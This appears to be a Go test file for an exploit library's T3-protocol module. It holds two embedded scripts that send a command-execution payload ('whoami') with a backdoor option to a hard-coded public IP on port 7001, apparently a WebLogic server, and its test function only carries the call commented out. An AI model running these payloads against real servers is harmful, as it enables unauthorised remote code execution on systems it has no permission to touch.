package t3

import (
	"testing"
)

const script1 = `t3payload = t3.NewT3Payload(t3.SetAddr("47.104.229.232:7001"),t3.SetClearBackdoor(true),t3.SetTimeout(1))
res,err = t3payload.Exec("whoami")
die(err)
println(res)`

const script2 = `t3payload = t3.NewT3Payload(t3.SetAddr("47.104.229.232:7001"),t3.SetClearBackdoor(true),t3.SetTimeout(1))
t3payload.SendPaylaod(t3.GenExecPayload("whoami"))`

func TestYak(t *testing.T) {
	//yak.NewScriptEngine(1).Execute(script1)
}
